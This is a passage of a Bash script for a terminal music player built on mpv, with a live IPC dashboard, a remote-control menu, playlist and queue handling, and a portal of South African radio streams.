                            -of default=noprint_wrappers=1 "$cur_file" 2>/dev/null)
                        ff_codec=$(printf "%s" "$_ffr2"|grep '^codec_name='|head -1|cut -d= -f2)
                        ff_br=$(printf "%s"    "$_ffr2"|grep '^bit_rate='|head -1|cut -d= -f2)
                        ff_ch=$(printf "%s"    "$_ffr2"|grep '^channels='|head -1|cut -d= -f2)
                        ff_sr=$(printf "%s"    "$_ffr2"|grep '^sample_rate='|head -1|cut -d= -f2)
                        ff_genre=$(printf "%s" "$_ffr2"|grep '^TAG:genre='|head -1|cut -d= -f2)
                        ff_year=$(printf "%s"  "$_ffr2"|grep '^TAG:date='|head -1|cut -d= -f2|cut -c1-4)
                        ff_tracknum=$(printf "%s" "$_ffr2"|grep '^TAG:track='|head -1|cut -d= -f2|cut -d/ -f1)
                        [[ -n "$ff_br" ]] && ff_br=$(( ff_br/1000 ))" kbps"
                        [[ -n "$ff_sr" ]] && ff_sr=$(( ff_sr/1000 ))" kHz"
                        case "$ff_ch" in 1) ff_ch="Mono";; 2) ff_ch="Stereo";; esac
                    fi
                fi
            fi

            # Load ASCII art once art file is ready
            if [[ $art_loaded -eq 0 && -f "$art_file" && -s "$art_file" ]]; then
                art_ascii=$(_ipc_show_art "$art_file" 2>/dev/null)
                art_loaded=1
            fi

            # Lyrics fetch once per track
            if (( lyric_fetched==0 && tick>=0 )); then
                _ipc_lyrics "$meta_artist" "$meta_title" "$lyric_file" &
                lyric_fetched=1
            fi

            # Progress bar
            local _COLS2; _COLS2=$(tput cols 2>/dev/null || echo 56)
            local bar_width=$(( _COLS2 - 6 )) filled bar="" j
            filled=$(( pos_int*bar_width/dur_int )); [[ $filled -gt $bar_width ]] && filled=$bar_width
            for ((j=0;j<filled;j++)); do bar+="━"; done
            bar+="◉"
            for ((j=filled+1;j<bar_width;j++)); do bar+="╌"; done

            local pos_min pos_sec dur_min dur_sec pct
            pos_min=$(( pos_int/60 )); pos_sec=$(( pos_int%60 ))
            dur_min=$(( dur_int/60 )); dur_sec=$(( dur_int%60 ))
            pct=0; (( dur_int>0 )) && pct=$(( pos_int*100/dur_int ))

            local disp_title="${meta_title:-$(basename "${_MP_FILES[$pl_pos]:-track}"|sed 's/\.[^.]*$//')}"
            local disp_artist="${meta_artist:-unknown frequency}"

            # Lyric scroll
            local lyric_line="${_soi[$soi_idx]}" lyric_line2="" lyric_line3=""
            if [[ -f "$lyric_file" ]]; then
                local lcount; lcount=$(wc -l<"$lyric_file" 2>/dev/null); (( lcount<1 )) && lcount=1
                local ln=$(( (tick/3) % lcount + 1 ))
                local ll; ll=$(sed -n "${ln}p" "$lyric_file" 2>/dev/null)
                local ln2=$(( ln % lcount + 1 ))
                local ll2; ll2=$(sed -n "${ln2}p" "$lyric_file" 2>/dev/null)
                local ln3=$(( ln2 % lcount + 1 ))
                local ll3; ll3=$(sed -n "${ln3}p" "$lyric_file" 2>/dev/null)
                [[ -n "$ll"  ]] && lyric_line="$ll"
                [[ -n "$ll2" ]] && lyric_line2="$ll2"
                [[ -n "$ll3" ]] && lyric_line3="$ll3"
            fi
            (( tick%5==0 )) && soi_idx=$(( (soi_idx+1)%${#_soi[@]} ))

            local s_icon s_label s_col
            if [[ "$paused_raw" == "true" ]]; then
                s_icon="⏸"; s_label="PAUSED  "; s_col="\033[0;33m"
            else
                s_icon="▶"; s_label="PLAYING "; s_col="\033[0;32m"
            fi

            # ── RENDER ──────────────────────────────────────────────────
            clear; echo ""
            local _COLS; _COLS=$(tput cols 2>/dev/null || echo 56)
            local _IPCW=$(( _COLS - 4 ))
            local _BORDER; printf -v _BORDER "%${_IPCW}s" ""; _BORDER="${_BORDER// /═}"
            local _BAR_W=$(( _COLS - 6 ))
            printf "  \033[2m╔%s╗\033[0m\n" "$_BORDER"
            printf "  \033[2m║\033[0m  \033[1;36m◈  F E Z Z Y  ·  I P C  ·  L I V E  ·  999\033[0m\n"
            printf "  \033[2m╚%s╝\033[0m\n\n" "$_BORDER"

            if [[ -n "$art_ascii" ]]; then
                printf "%s\n\n" "$art_ascii"
            else
                local _WW; _WW=$(tput cols 2>/dev/null || echo 56); _WW=$(( _WW - 6 ))
                local _wave1="" _wave2="" _wave3="" _wi
                local _wb1=("▁" "▂" "▃" "▄" "▅" "▆" "▇" "█" "▇" "▆" "▅" "▄" "▃" "▂" "▁" "▂" "▃" "▄" "▅" "▆" "▇" "█" "▇" "▆" "▅" "▄" "▃" "▂" "▁" "▂" "▄" "▆" "█" "▆" "▄" "▂" "▁" "▂" "▃" "▄" "▅" "▆" "▇" "█" "▇" "▆" "▅" "▄" "▃" "▂" "▁" "▂")
                local _wb2=("▂" "▄" "▆" "█" "▆" "▄" "▂" "▁" "▂" "▃" "▅" "▇" "█" "▇" "▅" "▃" "▂" "▁" "▂" "▄" "▆" "█" "▆" "▄" "▂" "▁" "▃" "▅" "▇" "█" "▇" "▅" "▃" "▁" "▂" "▄" "▆" "▇" "█" "▇" "▆" "▄" "▂" "▁" "▂" "▄" "▅" "▆" "▇" "█" "▇" "▆")
                local _wb3=("▃" "▅" "▇" "█" "▇" "▅" "▃" "▂" "▁" "▂" "▄" "▆" "█" "▆" "▄" "▂" "▁" "▂" "▃" "▅" "▇" "█" "▇" "▅" "▃" "▂" "▁" "▂" "▄" "▆" "█" "▆" "▄" "▂" "▁" "▃" "▅" "▇" "█" "▇" "▅" "▃" "▁" "▂" "▃" "▅" "▆" "▇" "█" "▇" "▆" "▅")
                for (( _wi=0; _wi<_WW && _wi<52; _wi++ )); do _wave1+="${_wb1[$_wi]}"; _wave2+="${_wb2[$_wi]}"; _wave3+="${_wb3[$_wi]}"; done
                printf "  \033[0;36m%s\033[0m\n" "$_wave1"
                printf "  \033[2;36m%s\033[0m\n" "$_wave2"
                printf "  \033[0;35m%s\033[0m\n" "$_wave3"
                printf "\n"
            fi

            printf "  \033[2mTrack \033[0m\033[1;36m%d\033[0m\033[2m / %s\033[0m\n\n" "$track_num" "$pl_count"

            printf "  \033[1;37m%s\033[0m\n" "$disp_title"
            printf "  \033[0;36m%s\033[0m" "$disp_artist"
            [[ -n "$meta_album" ]] && printf "  \033[2m·  %s\033[0m" "$meta_album"
            printf "\n\n"

            printf "  \033[0;36m%s\033[0m\n" "$bar"
            printf "  \033[1;37m%02d:%02d\033[0m \033[2m/ %02d:%02d  ·  %d%%\033[0m   %b%s %s\033[0m\n" \
                "$pos_min" "$pos_sec" "$dur_min" "$dur_sec" "$pct" "$s_col" "$s_icon" "$s_label"
            printf "  \033[2mvol\033[0m \033[0;36m%d%%\033[0m\n\n" "$vol_int"

            printf "  \033[2m┄┄┄┄┄┄┄┄┄  S I G N A L  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\033[0m\n"
            local il=""
            [[ -n "$ff_codec"    ]] && il+="  \033[2mcodec\033[0m \033[0;37m${ff_codec}\033[0m"
            [[ -n "$ff_br"       ]] && il+="   \033[2mbitrate\033[0m \033[0;37m${ff_br}\033[0m"
            [[ -n "$ff_ch"       ]] && il+="   \033[2m${ff_ch}\033[0m"
            [[ -n "$ff_sr"       ]] && il+="   \033[2m${ff_sr}\033[0m"
            printf "%b\n" "$il"
            local il2=""
            [[ -n "$ff_genre"    ]] && il2+="  \033[2mgenre\033[0m \033[0;37m${ff_genre}\033[0m"
            [[ -n "$ff_year"     ]] && il2+="   \033[2myear\033[0m \033[0;37m${ff_year}\033[0m"
            [[ -n "$ff_tracknum" ]] && il2+="   \033[2mtrack\033[0m \033[0;37m#${ff_tracknum}\033[0m"
            [[ -n "$il2" ]] && printf "%b\n" "$il2"
            printf "\n"

            printf "  \033[2m┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄  W O R D S  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\033[0m\n"
            printf "  \033[2m»\033[0m \033[1;37m%.55s\033[0m\n" "$lyric_line"
            [[ -n "$lyric_line2" ]] && printf "    \033[2;37m%.55s\033[0m\n" "$lyric_line2"
            [[ -n "$lyric_line3" ]] && printf "    \033[2;37m%.55s\033[0m\n" "$lyric_line3"
            printf "\n"

            printf "  \033[2m┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄  C O N T R O L S  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄\033[0m\n"
            printf "  \033[1;36m[p]\033[0m\033[2mpause  \033[1;36m[n]\033[0m\033[2mnext  \033[1;36m[v]\033[0m\033[2mprev  \033[1;36m[f]\033[0m\033[2m+10s  \033[1;36m[r]\033[0m\033[2m-10s\033[0m\n"
            printf "  \033[1;36m[+]\033[0m\033[2mvol+  \033[1;36m[-]\033[0m\033[2mvol-  \033[1;36m[s]\033[0m\033[2mshuffle  \033[1;36m[l]\033[0m\033[2mloop  \033[1;36m[q]\033[0m\033[2mquit\033[0m\n"
            printf "  \033[2mCtrl+C = exit dashboard · music keeps playing\033[0m\n"
            printf "  \033[2mSOI · 999 · Ravensmead · Bojack\033[0m\n"

            local ipc_key=""
            read -t 0.9 -r -s -n1 ipc_key 2>/dev/null || true

            case "$ipc_key" in
                p|P) _mp_ipc_send "$ipc_socket" '{"command":["cycle","pause"]}' >/dev/null ;;
                n|N) _mp_ipc_send "$ipc_socket" '{"command":["playlist-next"]}' >/dev/null ;;
                v|V) _mp_ipc_send "$ipc_socket" '{"command":["playlist-prev"]}' >/dev/null ;;
                f|F) _mp_ipc_send "$ipc_socket" '{"command":["seek","10"]}' >/dev/null ;;
                r|R) _mp_ipc_send "$ipc_socket" '{"command":["seek","-10"]}' >/dev/null ;;
                +|=) _mp_ipc_send "$ipc_socket" '{"command":["add","volume","10"]}' >/dev/null ;;
                -)   _mp_ipc_send "$ipc_socket" '{"command":["add","volume","-10"]}' >/dev/null ;;
                s|S) _mp_ipc_send "$ipc_socket" '{"command":["cycle","shuffle"]}' >/dev/null ;;
                l|L) _mp_ipc_send "$ipc_socket" '{"command":["cycle","loop-file"]}' >/dev/null ;;
                q|Q) running=0 ;;
            esac

            (( tick++ ))
        done
        trap - INT

        [[ -S "$ipc_socket"   ]] && rm -f "$ipc_socket"
        [[ -f "$lyric_file"   ]] && rm -f "$lyric_file"
        [[ -f "$art_file"     ]] && rm -f "$art_file"
        [[ -f "$ipc_playlist" ]] && rm -f "$ipc_playlist"
        printf "\n  \033[1;36m"; _ipc_tw "◈ signal out · 999 · SOI · always" 0.03; printf "\033[0m\n"
        printf "  \033[2mPress ENTER...\033[0m"; read -r
    }

    # ── Remote Control for running mpv via IPC ───────────────────────
    _mp_ipc_remote() {
        if ! command -v socat &>/dev/null; then
            printf "  ${YEL}socat not found — pkg install socat${RESET}\n"
            printf "  ${FADE}Press ENTER...${RESET}"; read -r
            return
        fi
        
        # Find IPC socket
        local ipc_socket
        ipc_socket=$(find "${TMPDIR:-/tmp}" -name "fezzy_mpv_ipc_*.sock" -type s 2>/dev/null | head -1)
        
        if [[ -z "$ipc_socket" ]]; then
            printf "  ${RED}No IPC socket found — start player with [17] first${RESET}\n"
            printf "  ${FADE}Press ENTER...${RESET}"; read -r
            return
        fi
        
        while true; do
            clear; echo ""
            _dv30
            printf "  ${C30}${BOLD}◉  REMOTE CONTROL  ·  MPV IPC COMMANDS${RESET}\n"
            _dv30; echo ""
            printf "  ${FADE}Connected to: %s${RESET}\n" "$(basename "$ipc_socket")"
            echo ""; _dv30; echo ""
            printf "  ${WH}[1]${RESET}  ${C30}Pause / Resume${RESET}\n"
            printf "  ${WH}[2]${RESET}  ${C30}Seek +10 seconds${RESET}\n"
            printf "  ${WH}[3]${RESET}  ${C30}Seek -10 seconds${RESET}\n"
            printf "  ${WH}[4]${RESET}  ${C30}Volume +10%%${RESET}\n"
            printf "  ${WH}[5]${RESET}  ${C30}Volume -10%%${RESET}\n"
            printf "  ${WH}[6]${RESET}  ${C30}Next track${RESET}\n"
            printf "  ${WH}[7]${RESET}  ${C30}Previous track${RESET}\n"
            printf "  ${WH}[8]${RESET}  ${C30}Stop playback${RESET}\n"
            printf "  ${WH}[9]${RESET}  ${C30}Get current status${RESET}\n"
            echo ""; _dv30
            printf "  ${FADE}[B] Back${RESET}\n\n"
            printf "  ${C30}Command » ${RESET}"; read -r rc_cmd
            
            case "$rc_cmd" in
                1)
                    _mp_ipc_send "$ipc_socket" '{"command":["cycle","pause"]}' >/dev/null
                    printf "  ${GRN}✓ Toggled pause${RESET}\n"
                    sleep 0.5 ;;
                2)
                    _mp_ipc_send "$ipc_socket" '{"command":["seek","10"]}' >/dev/null
                    printf "  ${GRN}✓ Seeked +10s${RESET}\n"
                    sleep 0.5 ;;
                3)
                    _mp_ipc_send "$ipc_socket" '{"command":["seek","-10"]}' >/dev/null
                    printf "  ${GRN}✓ Seeked -10s${RESET}\n"
                    sleep 0.5 ;;
                4)
                    _mp_ipc_send "$ipc_socket" '{"command":["add","volume","10"]}' >/dev/null
                    printf "  ${GRN}✓ Volume +10%%${RESET}\n"
                    sleep 0.5 ;;
                5)
                    _mp_ipc_send "$ipc_socket" '{"command":["add","volume","-10"]}' >/dev/null
                    printf "  ${GRN}✓ Volume -10%%${RESET}\n"
                    sleep 0.5 ;;
                6)
                    _mp_ipc_send "$ipc_socket" '{"command":["playlist-next"]}' >/dev/null
                    printf "  ${GRN}✓ Next track${RESET}\n"
                    sleep 0.5 ;;
                7)
                    _mp_ipc_send "$ipc_socket" '{"command":["playlist-prev"]}' >/dev/null
                    printf "  ${GRN}✓ Previous track${RESET}\n"
                    sleep 0.5 ;;
                8)
                    _mp_ipc_send "$ipc_socket" '{"command":["quit"]}' >/dev/null
                    printf "  ${GRN}✓ Stopped playback${RESET}\n"
                    sleep 1
                    return ;;
                9)
                    clear; echo ""
                    _dv30
                    printf "  ${C30}${BOLD}CURRENT STATUS${RESET}\n"
                    _dv30; echo ""
                    local time_pos duration paused_raw vol
                    time_pos=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","time-pos"]}' | grep -o '"data":[0-9.]*' | cut -d: -f2)
                    duration=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","duration"]}' | grep -o '"data":[0-9.]*' | cut -d: -f2)
                    paused_raw=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","pause"]}' | grep -o '"data":[a-z]*' | cut -d: -f2)
                    vol=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","volume"]}' | grep -o '"data":[0-9.]*' | cut -d: -f2)
                    local pos_int dur_int
                    pos_int=$(echo "$time_pos" | awk '{print int($1)}' 2>/dev/null)
                    dur_int=$(echo "$duration" | awk '{print int($1)}' 2>/dev/null)
                    [[ -z "$pos_int" ]] && pos_int=0
                    [[ -z "$dur_int" ]] && dur_int=0
                    printf "  ${WH}Position:${RESET}  %d:%02d / %d:%02d\n" \
                        $(( pos_int / 60 )) $(( pos_int % 60 )) \
                        $(( dur_int / 60 )) $(( dur_int % 60 ))
                    printf "  ${WH}Status:${RESET}    "
                    if [[ "$paused_raw" == "true" ]]; then
                        printf "${YEL}Paused${RESET}\n"
                    else
                        printf "${GRN}Playing${RESET}\n"
                    fi
                    printf "  ${WH}Volume:${RESET}    %.0f%%\n" "$vol"
                    echo ""; _dv30
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                B|b) return ;;
                *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.5 ;;
            esac
        done
    }

    # ── mpv now-playing status ────────────────────────────────────────
    _mp_now_playing() {
        local np; np=$(pgrep -a mpv 2>/dev/null | head -1)
        clear; echo ""
        _dv30
        printf "  ${C30}${BOLD}NOW PLAYING STATUS${RESET}\n"
        _dv30; echo ""
        if [[ -n "$np" ]]; then
            printf "  ${GRN}● mpv is RUNNING${RESET}\n\n"
            printf "  ${WH}%s${RESET}\n" "$np"
        else
            printf "  ${C30}○ mpv NOT RUNNING${RESET}\n"
        fi
        echo ""; _dv30
        printf "  ${FADE}Press ENTER...${RESET}"; read -r
    }

    # ── MAIN LOOP ────────────────────────────────────────────────────
    while true; do
        clear; echo ""
        _dv30
        printf "  ${C30}${BOLD}▶  LOCAL MUSIC PLAYER  ·  MPV · MULTI-FOLDER · 999${RESET}\n"
        _dv30; echo ""
        _hover_hint "musicplayer"
        echo ""
        local track_count; track_count=$(_mp_count)
        printf "  ${C30}Total tracks:${RESET}  ${WH}%s${RESET}\n" "$track_count"
        printf "  ${FADE}Scanning: downloads/music · MyDocuments/MUSIC · fezzy_artist${RESET}\n"
        echo ""; _dv30; echo ""
        printf "  ${WH}[1]${RESET}  ${C30}Play all — shuffle${RESET}        ${FADE}→ random across all folders${RESET}\n"
        printf "  ${WH}[2]${RESET}  ${C30}Play all — in order${RESET}       ${FADE}→ sorted A-Z · next/prev with < >${RESET}\n"
        printf "  ${WH}[3]${RESET}  ${C30}Browse and pick${RESET}           ${FADE}→ paged list · pick track number${RESET}\n"
        printf "  ${WH}[4]${RESET}  ${C30}Search artist / title${RESET}     ${FADE}→ keyword search across vault${RESET}\n"
        printf "  ${WH}[5]${RESET}  ${C30}Play by folder${RESET}            ${FADE}→ choose a specific folder${RESET}\n"
        printf "  ${WH}[6]${RESET}  ${C30}Create playlist${RESET}           ${FADE}→ pick tracks → save .m3u${RESET}\n"
        printf "  ${WH}[7]${RESET}  ${C30}Load saved playlist${RESET}       ${FADE}→ play a .m3u file${RESET}\n"
        printf "  ${WH}[8]${RESET}  ${C30}Background mode${RESET}           ${FADE}→ shuffle in background · keep working${RESET}\n"
        printf "  ${WH}[9]${RESET}  ${C30}Stop player${RESET}               ${FADE}→ pkill mpv${RESET}\n"
        printf "  ${WH}[10]${RESET} ${C30}Now playing status${RESET}        ${FADE}→ mpv running check + track${RESET}\n"
        printf "  ${WH}[11]${RESET} ${C30}Lyrics finder${RESET}             ${FADE}→ type song → lyrics appear · save${RESET}\n"
        printf "  ${WH}[12]${RESET} ${C30}Lyrics while playing${RESET}      ${FADE}→ pick track · play bg · show lyrics${RESET}\n"
        printf "  ${WH}[13]${RESET} ${C30}Track info / bitrate${RESET}      ${FADE}→ ffprobe metadata · format · size${RESET}\n"
        printf "  ${WH}[14]${RESET} ${C30}Export track list${RESET}         ${FADE}→ save full list as .txt file${RESET}\n"
        printf "  ${WH}[15]${RESET} ${C30}Queue builder${RESET}             ${FADE}→ pick tracks by number → play queue${RESET}\n"
        printf "  ${WH}[16]${RESET} ${C30}Live track display${RESET}        ${FADE}→ live updating now-playing · Ctrl+C to exit${RESET}\n"
        printf "  ${WH}[17]${RESET} ${C30}IPC Full Player${RESET}           ${FADE}→ mpv with live dashboard · progress bar · metadata${RESET}\n"
        printf "  ${WH}[18]${RESET} ${C30}Remote Control${RESET}            ${FADE}→ control running mpv · pause/seek/vol · via IPC${RESET}\n"
        echo ""
        printf "  ${FADE}── RADIO ───────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[R]${RESET}  ${C30}Radio Portal by Fezzy${RESET}     ${FADE}→ SA live streams · 11 stations · custom URL${RESET}\n"
        echo ""
        printf "  ${FADE}── UTIL ────────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[RF]${RESET} ${C30}Refresh track cache${RESET}       ${FADE}→ force rescan all folders (clears 5-min cache)${RESET}\n"
        echo ""
        printf "  ${FADE}MPV KEYS: Space=pause  ←/→=seek  </>=skip  [/]=vol  9/0=vol  Q=quit${RESET}\n"
        echo ""; _dv30; echo ""
        printf "  ${FADE}[B] Back${RESET}\n\n"
        printf "  ${C30}${BOLD}Choice » ${RESET}"; read -r mc

        case "$mc" in
            1)
                _mp_check; _mp_scan
                if (( ${#_MP_FILES[@]} == 0 )); then
                    printf "  ${RED}No tracks found${RESET}\n"; sleep 1; continue
                fi
                printf "  ${C30}▶ Shuffle all %d tracks...${RESET}\n" "${#_MP_FILES[@]}"
                printf "  ${FADE}Space pause · < prev · > next · Q quit${RESET}\n\n"
                _mp_play_from 0 "yes"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                _mp_check; _mp_scan
                if (( ${#_MP_FILES[@]} == 0 )); then
                    printf "  ${RED}No tracks found${RESET}\n"; sleep 1; continue
                fi
                printf "  ${C30}▶ Playing all %d tracks in order...${RESET}\n" "${#_MP_FILES[@]}"
                printf "  ${FADE}Space pause · < prev · > next · Q quit${RESET}\n\n"
                _mp_play_from 0 "no"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3) _mp_browse ;;
            4) _mp_search ;;
            5)
                _mp_check
                local -a folders=()
                for d in "${SCAN_DIRS[@]}"; do
                    [[ -d "$d" ]] || continue
                    while IFS= read -r fd; do folders+=("$fd"); done < <(find "$d" -mindepth 0 -maxdepth 2 -type d 2>/dev/null | sort)
                done
                if (( ${#folders[@]} == 0 )); then
                    printf "  ${RED}No folders found${RESET}\n"; sleep 1; continue
                fi
                clear; echo ""
                _dv30
                printf "  ${C30}${BOLD}CHOOSE FOLDER${RESET}\n"
                _dv30; echo ""
                for i in "${!folders[@]}"; do
                    local fc; fc=$(find "${folders[$i]}" -maxdepth 1 -type f \( -iname "*.mp3" -o -iname "*.flac" -o -iname "*.m4a" -o -iname "*.ogg" \) 2>/dev/null | wc -l)
                    (( fc == 0 )) && continue
                    printf "  ${C30}%2d.${RESET}  ${WH}%-42s${RESET}  ${FADE}%s tracks${RESET}\n" \
                        "$((i+1))" "$(basename "${folders[$i]}")" "$fc"
                done
                echo ""; _dv30
                printf "  ${FADE}[B] Back${RESET}\n\n"
                printf "  ${C30}Folder number or B » ${RESET}"; read -r fnum
                [[ "$fnum" == "B" || "$fnum" == "b" ]] && continue
                if [[ "$fnum" =~ ^[0-9]+$ ]] && (( fnum >= 1 && fnum <= ${#folders[@]} )); then
                    local fidx=$(( fnum - 1 ))
                    printf "  ${C30}▶ Playing: %s${RESET}\n" "$(basename "${folders[$fidx]}")"
                    printf "  ${FADE}< prev · > next · Q quit${RESET}\n\n"
                    mpv --no-video --shuffle "${folders[$fidx]}" 2>/dev/null
                fi
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                _mp_scan
                if (( ${#_MP_FILES[@]} == 0 )); then
                    printf "  ${RED}No tracks found${RESET}\n"; sleep 1; continue
                fi
                clear; echo ""
                _dv30
                printf "  ${C30}${BOLD}CREATE PLAYLIST${RESET}\n"
                _dv30; echo ""
                for i in "${!_MP_FILES[@]}"; do
                    printf "  ${C30}%3d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${_MP_FILES[$i]}")"
                done
                echo ""
                printf "  ${C30}Track numbers (e.g. 1 3 7 12): ${RESET}"; read -r pnums
                printf "  ${C30}Playlist name: ${RESET}"; read -r pname
                [[ -z "$pname" ]] && pname="playlist_$(date +%Y%m%d_%H%M)"
                local pfile="$PLDIR/${pname}.m3u"
                printf "#EXTM3U\n" > "$pfile"
                for n in $pnums; do
                    local pidx=$(( n - 1 ))
                    [[ -n "${_MP_FILES[$pidx]}" ]] && echo "${_MP_FILES[$pidx]}" >> "$pfile"
                done
                printf "  ${GRN}✓ Saved: %s${RESET}\n" "$pfile"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                mapfile -t PLISTS < <(find "$PLDIR" -name "*.m3u" -type f 2>/dev/null | sort)
                if (( ${#PLISTS[@]} == 0 )); then
                    printf "  ${FADE}No playlists yet — create one with [6]${RESET}\n"
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                clear; echo ""
                _dv30
                printf "  ${C30}${BOLD}SAVED PLAYLISTS${RESET}\n"
                _dv30; echo ""
                for i in "${!PLISTS[@]}"; do
                    printf "  ${C30}%2d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${PLISTS[$i]}")"
                done
                echo ""; _dv30
                printf "  ${FADE}[B] Back${RESET}\n\n"
                printf "  ${C30}Number or B » ${RESET}"; read -r plnum
                [[ "$plnum" == "B" || "$plnum" == "b" ]] && continue
                if [[ "$plnum" =~ ^[0-9]+$ ]] && (( plnum >= 1 && plnum <= ${#PLISTS[@]} )); then
                    _mp_check
                    printf "  ${C30}▶ Playing: %s${RESET}\n" "$(basename "${PLISTS[$((plnum-1))]}")"
                    printf "  ${FADE}< prev · > next · Q quit${RESET}\n\n"
                    mpv --no-video --playlist="${PLISTS[$((plnum-1))]}" 2>/dev/null
                fi
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                _mp_check; _mp_scan
                if (( ${#_MP_FILES[@]} == 0 )); then
                    printf "  ${RED}No tracks found${RESET}\n"; sleep 1; continue
                fi
                local tmpbg="${TMPDIR:-/tmp}/fezzy_bg_$$.m3u"
                printf "#EXTM3U\n" > "$tmpbg"
                for f in "${_MP_FILES[@]}"; do echo "$f"; done >> "$tmpbg"
                nohup mpv --no-video --shuffle --playlist="$tmpbg" &>/dev/null &
                printf "  ${GRN}✓ Playing %d tracks in background · [9] to stop${RESET}\n" "${#_MP_FILES[@]}"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                pkill mpv 2>/dev/null \
                    && printf "  ${GRN}✓ mpv stopped${RESET}\n" \
                    || printf "  ${FADE}Nothing playing${RESET}\n"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10) _mp_now_playing ;;
            11) _mp_lyrics ;;
            12) _mp_lyrics_play ;;
            13) _mp_track_info ;;
            14) _mp_export_list ;;
            15)
                _mp_check; _mp_scan
                if (( ${#_MP_FILES[@]} == 0 )); then
                    printf "  ${RED}No tracks found${RESET}\n"; sleep 1; continue
                fi
                clear; echo ""
                _dv30
                printf "  ${C30}${BOLD}QUEUE BUILDER${RESET}\n"
                printf "  ${FADE}Pick track numbers to queue up, then play in order${RESET}\n"
                _dv30; echo ""
                for i in "${!_MP_FILES[@]}"; do
                    printf "  ${C30}%3d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${_MP_FILES[$i]}")"
                done
                echo ""; _dv30
                printf "  ${FADE}Enter numbers separated by spaces (e.g. 3 7 12 1)${RESET}\n\n"
                printf "  ${C30}Queue (numbers): ${RESET}"; read -r qnums
                local tmpq="${TMPDIR:-/tmp}/fezzy_q_$$.m3u"
                printf "#EXTM3U\n" > "$tmpq"
                local qcount=0
                for n in $qnums; do
                    if [[ "$n" =~ ^[0-9]+$ ]] && (( n >= 1 && n <= ${#_MP_FILES[@]} )); then
                        echo "${_MP_FILES[$((n-1))]}" >> "$tmpq"
                        (( qcount++ ))
                    fi
                done
                if (( qcount > 0 )); then
                    echo ""
                    printf "  ${C30}▶ Playing queue of %d tracks${RESET}\n" "$qcount"
                    printf "  ${FADE}< prev · > next · Space pause · Q quit${RESET}\n\n"
                    mpv --no-video --playlist="$tmpq" 2>/dev/null
                else
                    printf "  ${RED}No valid track numbers entered${RESET}\n"
                fi
                rm -f "$tmpq"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            R|r)
                # ── RADIO PORTAL ──────────────────────────────────────────
                local -A _RADIO_STATIONS=(
                    [1]="5FM|https://streams.sabc.co.za/sabc/5fm-audio/playlist.m3u8"
                    [2]="Metro FM|https://streams.sabc.co.za/sabc/metro-audio/playlist.m3u8"
                    [3]="KFM 94.5|https://icecast.kfm.co.za/kfm.mp3"
                    [4]="East Coast Radio|https://playerservices.streamtheworld.com/api/livestream-redirect/ECRAUDIO.mp3"
                    [5]="CapeTalk 567|https://playerservices.streamtheworld.com/api/livestream-redirect/CAPETALK.mp3"
                    [6]="Heart FM|https://stream.heartfm.co.za:8001/heartfm"
                    [7]="Jacaranda FM|https://stream.jacarandafm.co.za/jacaranda"
                    [8]="YFM 99.2|https://playerservices.streamtheworld.com/api/livestream-redirect/YFMAUDIO.mp3"
                    [9]="Radio 2000|https://streams.sabc.co.za/sabc/radio2000-audio/playlist.m3u8"
                    [10]="P4 Radio|https://stream.p4.co.za:8000/p4"
                    [11]="Classic FM|https://playerservices.streamtheworld.com/api/livestream-redirect/CLASSICFM.mp3"
                )
                while true; do
                    clear; echo ""
                    _dv30
                    printf "  ${C30}${BOLD}RADIO PORTAL BY FEZZY  ·  SA LIVE STREAMS  ·  999${RESET}\n"
                    _dv30; echo ""
                    printf "  ${FADE}mpv streams direct · jq resolves JSON endpoints · Q to stop${RESET}\n"
                    echo ""; _dv30; echo ""
                    for _rk in $(echo "${!_RADIO_STATIONS[@]}" | tr ' ' '\n' | sort -n); do
                        local _rn="${_RADIO_STATIONS[$_rk]%%|*}"
                        printf "  ${C30}${BOLD}[%2s]${RESET}  ${WH}%s${RESET}\n" "$_rk" "$_rn"
                    done
                    echo ""
                    printf "  ${C30}${BOLD}[C]${RESET}   ${WH}Custom Stream URL${RESET}          ${FADE}— paste any stream URL${RESET}\n"
                    printf "  ${C30}${BOLD}[S]${RESET}   ${WH}Stop Radio${RESET}                 ${FADE}— pkill mpv${RESET}\n"
                    echo ""; _dv30; echo ""
                    printf "  ${FADE}[B] Back  ·  Tip: if stream fails try [C] with a direct URL${RESET}\n\n"
                    printf "  ${C30}${BOLD}Station » ${RESET}"; read -r _rc
                    case "$_rc" in
                        [0-9]|1[01])
                            local _sd="${_RADIO_STATIONS[$_rc]}"
                            if [[ -z "$_sd" ]]; then
                                printf "  ${RED}Invalid station${RESET}\n"; sleep 0.7; continue
                            fi
                            local _sname="${_sd%%|*}"
                            local _surl="${_sd#*|}"
                            echo ""
                            printf "  ${C30}▶ Tuning: %s${RESET}\n" "$_sname"
                            printf "  ${FADE}Q to stop · Ctrl+C to interrupt${RESET}\n\n"
                            mpv --no-video --title="Fezzy Radio: $_sname" "$_surl" 2>/dev/null \
                                || printf "  ${RED}Stream failed — try [C] with a direct URL or check connection${RESET}\n"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        C|c)
                            echo ""
